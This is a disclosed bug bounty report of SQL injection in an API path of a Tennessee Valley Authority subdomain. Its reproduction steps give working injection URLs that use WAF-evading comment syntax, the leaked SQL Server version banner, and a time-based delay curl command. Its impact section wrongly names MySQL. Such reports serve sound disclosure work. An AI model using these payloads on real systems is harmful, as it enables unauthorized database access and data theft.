# SQL Injection on https://soa-accp.glbx.tva.gov/ via "/api/" path - VI-21-015

## Report Details
- **Report ID**: 1125752
- **URL**: https://hackerone.com/reports/1125752
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-03-15T08:48:47.169Z
- **Disclosed**: 2022-04-26T19:33:04.174Z

## Reporter
- **Username**: yassinek3ch
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: tennessee-valley-authority

## Vulnerability Information
## Summary:
 
i've found this subdomain ```soa-accp.glbx.tva.gov``` also is vulnerable to SQLI through /api/ path

## Steps To Reproduce:

```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+-``` hostname dumped

```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+@@version--+-``` 

Microsoft SQL Server 2017 (RTM-CU22-GDR) (KB4583457) - 14.0.3370.1 (X64) \n\tNov  6 2020 18:19:52 \n\tCopyright (C) 2017 Microsoft Corporation\n\tEnterprise Edition (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\n

also you can retest it through time bassed trick

```time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"```

{F1230364}

## Impact

An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.

## Attachments
- Screenshot_2021-03-15_at_09.47.58.png
